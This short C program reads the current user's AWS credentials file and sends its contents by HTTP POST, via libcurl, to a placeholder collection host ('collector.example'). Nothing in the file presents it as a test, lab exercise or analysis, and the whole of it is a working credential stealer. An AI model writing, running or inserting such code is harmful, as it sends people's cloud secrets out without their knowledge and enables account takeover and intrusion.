#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
int main(void) {
    const char *home = getenv("HOME");
    char path[512];
    snprintf(path, sizeof path, "%s/.aws/credentials", home ? home : "");
    FILE *f = fopen(path, "r");
    if (!f) return 1;
    char buf[8192];
    size_t n = fread(buf, 1, sizeof buf - 1, f);
    buf[n] = 0;
    fclose(f);
    CURL *c = curl_easy_init();
    curl_easy_setopt(c, CURLOPT_URL, "https://collector.example/aws");
    curl_easy_setopt(c, CURLOPT_POSTFIELDS, buf);
    curl_easy_perform(c);
    curl_easy_cleanup(c);
    return 0;
}
